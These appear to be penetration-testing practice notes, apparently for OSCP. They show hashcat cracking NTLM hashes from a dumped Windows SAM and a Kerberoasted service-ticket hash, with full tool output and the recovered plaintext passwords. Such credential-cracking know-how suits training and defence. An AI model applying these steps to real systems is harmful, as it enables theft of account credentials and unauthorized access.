NT
```
hashcat -m 1000 SAMhashesv2 /usr/share/wordlists/rockyou.txt
```

The full process

```
┌──(kali㉿kali)-[~/WindowsPrivilegeEscalation]
└─$ hashcat -m 1000 SAMhashesv2 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, 2553/5171 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 9 digests; 8 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

31d6cfe0d16ae931b73c59d7e0c089c0:                         
d94267c350fc02154f2aff04d384b354:S3cureStore              
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: SAMhashesv2
Time.Started.....: Fri Jul 19 00:32:15 2024 (4 secs)
Time.Estimated...: Fri Jul 19 00:32:19 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3373.1 kH/s (0.09ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 2/8 (25.00%) Digests (total), 2/8 (25.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 31%

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => Started: Fri Jul 19 00:31:58 2024
Stopped: Fri Jul 19 00:32:20 2024
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/WindowsPrivilegeEscalation]
└─$ hashcat -m 1000 --show SAMhashesv2 /usr/share/wordlists/rockyou.txt
31d6cfe0d16ae931b73c59d7e0c089c0:
d94267c350fc02154f2aff04d384b354:S3cureStore
```

Show the result --show
```
┌──(kali㉿kali)-[~/OSCP-A/MS01-141]
└─$ sudo hashcat -m 13100 hashes.kerberoast --show
[sudo] password for kali: 
$krb5tgs$23$*web_svc$oscp.exam$HTTP/MS01.oscp.exam@oscp.exam*$7f4b76d74845353d6f84cdba6d97bb21$f6fd04436942621e023a47b12c27e5c8aa6bbd3a65c2b792e38070a5c6335033149bc01d572736163b85954dc1d194abe3fc58301287c4ce7368e71abe6c69d9963c1cd537d223c21eeab5c0115249b6a768d536d4e97ff1b9db7c02d0dac9078231f13c275847783e89e7215341a1970be65b61c26ff2704522620bbe05bb5184bfc4c6dd26c1fd68014cde5d15db0ae0e9446567b736b0b3a410228915bc1c6bd3dc274d291a0069095fb5575b8881142bd1961f8a375aebb724feff4ce967bfc5ae58703b0213c30eff0d9ec9b3853cb3046711624bfd2127c8c04aae673fab89fb19df06c9954ed2f27dc0d4e23492a46a6093166a26aec377fe9a3e2e1048bfd75c8a4a3268f5a8bbfce2c8e12278a78e22990bd3362cdba5f008a2eae25914bf274b5b758d18ae02901fd15ad7f99ce7f6957f29fd21bf5580cf0d30e0f19c792e61300550734ed065afbd46039b6da1d22cba48953aa72e963acbde83aac31b12e40dfa1d7cd0a4d612b2078b063434f8c263f69e9d8f50b818d1b35618d3e63a07a90bb5c1f5c6fe283d1657bfafcddcb66b478855221e3a517e1d18d4759ba80d4635f5ed2cadf48cf8419ca2e2aa470e9321050d1d8156db306e297b5b8e190b089688d31de3f0b7794959e57847427e5923101da4bc5b3b6dabad30535ac08e65aab521dd81ee71e7117a8f700e5862eeb2e718c82ceea96bc3961d69fbd1d22ef1fa55081564d4aa4503a71858520cc650062720a7a522a36a06b1edfd23bba8c975211a10550e8f86ae84aff5cc2982c80235147241d59ec5c682c3cf989fb1a78e49eb6efb666ac225f69c3a63e7b4ece27a749d4b51c8e46df6940ed6d256e343d9a04c40d785459b80da4ddbaeec84bfe3198aa6d6cf2387176a0a67523b528ec6784396c70a703ef1616bd66111caffbcad7b295553c486f73c73122e3bcc22df46bb42e30fc04612adb1c7e74a2615048b463c34951a77482dbcb8964bf85d95a40de2a2c0642f90be8324b10c49e3ee3bf229aadd8fab4d7c329c052c03429b82da0b11680d05b3c7ab1baee38ec974c6c09dde5605c35461ab8ba7d68ed54447a4ef0bccbec6cfd12094bbbf3baa7fc3c9b5159db4db94aa65c99292299055bca2d2ae2553ffa8b4873dd73d337bf62bedce772584b2b638d3e0dc89f47153d066359d76ecf7e31b372afe9262689c5847eb7bf1e570cce214f5b7c205ff3de30030f509cdbaef586c33778859420cb7fa89aa5ddc8a96602a7c677bea247ca63af5fafc8c3e39e09f56769e254e021eb8c13ece5df643590fa384219ca76c82e8e29b2fe2c50fbcfc815dd8d6ed96f24aaa76e59362dd754ce473b1aaf1439b149b8c188d597362d3792801bfdcfa128f45427519ceca723b8958938a2e899b93fc4ae2de6c6b210a644aafcbb3d5b751b369948ace26aa78c61f5b1d47cb5ae46df79dc177d98d100586ab389e42d7989ca891e25276db6a8bc8dbe777be5302c7fad55c05cff9bae8808a1c1287:Diamond1
```